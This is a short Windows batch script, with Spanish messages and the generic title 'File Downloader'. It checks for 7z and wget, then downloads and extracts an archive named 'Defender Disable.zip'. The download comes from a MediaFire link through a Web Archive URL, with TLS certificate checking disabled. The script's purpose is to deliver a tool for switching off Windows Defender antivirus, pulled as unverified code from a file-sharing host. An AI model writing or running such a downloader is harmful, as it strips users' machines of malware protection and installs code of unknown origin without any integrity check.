@echo off
title File Downloader

where 7z >nul 2>&1
if errorlevel 1 (
    echo ERROR: No existe 7z!
    pause
    exit /b 1
)

where wget >nul 2>&1
if errorlevel 1 (
    echo ERROR: No existe WGET!
    pause
    exit /b 1
)

echo Descargando el Archivo...
wget -q --no-check-certificate --show-progress --connect-timeout=15 --tries=3 -O "%TEMP%\DefenderDisable.zip" "https://web.archive.org/web/20260412230125/https://download1640.mediafire.com/9pze0l9pi57gT__oYf_-ygTjZvMyqE1IuCaygJCJN5OwqjrR2CJVfmoxa9r8QxnKop_sKBe86j0X4HBV63uLMbwFQbbA0xNnTV8Ko1O7abLekz0kPaVoRpwpsFgP3n6couqtecEnnLnN8EhKnb8i5ZF0BwyTsnIc2qocfveFYETiVw/x267snw96vh4ovf/Defender Disable.zip"

if errorlevel 1 (
    echo ERROR: No se pudo descargar el archivo
    echo Verifica tu conexion a internet o intenta nuevamente
    pause
    exit /b 1
)

7z x "%TEMP%\DefenderDisable.zip"
del "%TEMP%\DefenderDisable.zip"